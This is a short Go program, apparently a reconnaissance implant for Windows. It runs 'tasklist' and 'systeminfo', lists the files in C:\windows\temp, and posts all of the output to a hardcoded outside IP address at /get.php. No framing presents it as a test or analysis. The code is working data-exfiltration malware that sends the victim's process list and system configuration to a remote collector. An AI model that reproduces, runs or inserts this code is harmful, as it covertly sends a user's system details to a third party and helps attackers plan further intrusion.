package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"strings"
)

func taskinfo() string {
	cmd := exec.Command("cmd", "/C", "tasklist")
	fmt.Println(cmd)
	output, err := cmd.Output()
	if err != nil {
		fmt.Println(err)
	}
	res := string(output)
	return res
}

func fileinfo() string {
	path := "C:\\windows\\temp"
	var res []string
	_, err := os.Stat(path)
	fmt.Println(err)
	if os.IsNotExist(err) {
	} else {
		print(111)
		localDir := path
		files, err := ioutil.ReadDir(localDir)
		if err != nil {

		}
		for _, i := range files {
			res = append(res, i.Name())
		}

	}
	if err != nil {
	}
	filenames := strings.Join(res, "\n")

	return filenames
}

func systeminfo() string {
	cmd := exec.Command("cmd", "/C", "systeminfo")
	fmt.Println(cmd)
	output, err := cmd.Output()
	if err != nil {
		fmt.Println(err)
	}
	res := string(output)
	return res
}

func puts() {
	taskdata := "-------------taskinfo--------------" + "\n\n" + taskinfo() + "\n\n"
	fildata := "-------------C:\\windows\\temp--------------" + "\n\n" + fileinfo() + "\n"
	systemdata := "-------------systeminfo--------------" + "\n\n" + systeminfo() + "\n"
	data := taskdata + fildata + systemdata
	req, err := http.PostForm("http://146.56.230.148/get.php", url.Values{"info": {data}})
	if err != nil {
	}
	defer req.Body.Close()
	fmt.Scanln()
}

func main() {
	fmt.Println("begin!")
	puts()
}
